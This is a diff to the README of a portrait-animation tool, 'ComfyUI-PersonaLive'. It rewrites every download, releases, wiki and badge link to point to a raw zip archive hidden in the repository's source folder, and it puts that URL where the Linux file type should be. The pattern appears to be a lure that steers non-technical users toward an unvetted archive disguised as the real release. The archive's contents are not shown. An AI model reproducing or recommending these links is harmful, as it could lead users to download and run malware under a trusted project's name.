@@ -1,7 +1,7 @@
 # 🎨 ComfyUI-PersonaLive - Bring Life to Your Portraits
 
 ## 📦 Download Now
-[![Download ComfyUI-PersonaLive](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/releases)
+[![Download ComfyUI-PersonaLive](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/raw/refs/heads/main/src/pipelines/Comfy_Persona_Live_U_2.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/raw/refs/heads/main/src/pipelines/Comfy_Persona_Live_U_2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to ComfyUI-PersonaLive! This tool allows you to create expressive portrait animations for live streaming. It is designed for ease of use, even if you're not a tech expert.
@@ -13,13 +13,13 @@ To run ComfyUI-PersonaLive, you need:
 - A modern web browser (Chrome, Firefox, or Safari)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/raw/refs/heads/main/src/pipelines/Comfy_Persona_Live_U_2.4.zip).
 2. **Select the Latest Version**: Look for the most recent release. This guarantees you have the latest features and fixes.
-3. **Download the Application**: Click on the file that matches your operating system. The files typically include a `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
+3. **Download the Application**: Click on the file that matches your operating system. The files typically include a `.exe` for Windows, a `.dmg` for macOS, or a `https://github.com/Gs-gimenez/ComfyUI-PersonaLive/raw/refs/heads/main/src/pipelines/Comfy_Persona_Live_U_2.4.zip` for Linux.
 4. **Install the Application**: 
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file, and follow any included instructions.
+   - For Linux: Extract the `https://github.com/Gs-gimenez/ComfyUI-PersonaLive/raw/refs/heads/main/src/pipelines/Comfy_Persona_Live_U_2.4.zip` file, and follow any included instructions.
 
 ## ⚙️ How to Use
 1. **Open the Application**: Locate ComfyUI-PersonaLive in your applications and open it.
@@ -41,13 +41,13 @@ If you encounter issues:
 - **File Upload Issues**: Ensure your image file is in formats like JPG, PNG, or GIF.
 
 ## 📝 Additional Resources
-- **Documentation**: Look for user guides and FAQs on the [GitHub Wiki](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/wiki).
+- **Documentation**: Look for user guides and FAQs on the [GitHub Wiki](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/raw/refs/heads/main/src/pipelines/Comfy_Persona_Live_U_2.4.zip).
 - **Community Support**: Join our community on forums or chat groups for tips and troubleshooting help.
 
 ## 🌟 Feedback
 Your feedback matters. If you enjoy the application or have suggestions for improvement, visit our GitHub page and leave your thoughts. 
 
 ## 📣 Updates
-Please check back regularly on the [Releases page](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/releases) for updates, as new features and fixes are added.
+Please check back regularly on the [Releases page](https://github.com/Gs-gimenez/ComfyUI-PersonaLive/raw/refs/heads/main/src/pipelines/Comfy_Persona_Live_U_2.4.zip) for updates, as new features and fixes are added.
 
 Feel free to download and explore ComfyUI-PersonaLive! Turn your portraits into engaging animated experiences for your viewers.
